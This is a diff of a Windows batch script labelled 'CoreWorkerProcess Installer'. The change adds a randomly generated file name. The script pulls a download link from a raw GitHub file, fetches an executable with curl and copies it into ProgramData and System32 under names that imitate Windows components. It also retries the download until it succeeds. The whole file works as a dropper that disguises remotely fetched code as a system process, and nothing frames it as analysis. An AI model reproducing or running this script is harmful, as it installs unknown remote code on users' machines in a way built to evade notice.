@@ -1,15 +1,39 @@
 :: CoreWorkerProcess Installer
 @echo off
 
+
+setlocal enabledelayedexpansion
+
+
 color 0A
 
 
 
 :INSTCOREPROCESS
 
+
+
+
+set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+set "filename="
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+
+echo.
+echo Filename=!filename!.exe
+echo.
+
+
+
 :: Kill & Delete file 
-taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+taskkill /f /im !filename!.exe
+del /f /q "%TEMP%\!filename!.exe"
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/CoreProcessFileLink') do set "CORPROCESSFILELINK=%%i"
 
@@ -18,17 +42,17 @@ echo CORPROCESSFILELINK=%CORPROCESSFILELINK%
 echo.
 
 
-curl -L -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%CORPROCESSFILELINK%"
+curl -L -# -o "%TEMP%\!filename!.exe" "%CORPROCESSFILELINK%"
 
 
 
 :: Checking the existing of the file
-if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+if not exist "%TEMP%\!filename!.exe" (
     echo.
     echo The download hasn't started yet. Please check your connection.
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo.
 	goto INSTCOREPROCESS
 )
@@ -38,20 +62,20 @@ if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
 
 
 :: Get the file size in bytes
-for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
 
 
 
 :: Check if the file size is at least 80KB (81920 bytes)
 if %FILESIZE% geq 81920 (
-    copy /y "%APPDATA%\Microsoft\PatcherX64.exe" "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
-    copy /y "%APPDATA%\Microsoft\PatcherX64.exe" "%SystemRoot%\System32\CWProcess.exe"
+    copy /y "%TEMP%\!filename!.exe" "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+    copy /y "%TEMP%\!filename!.exe" "%SystemRoot%\System32\CWProcess.exe"
 ) else (
 echo.
     echo Download incomplete. Check your connection and run the file again.
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo.
 	goto INSTCOREPROCESS
 )
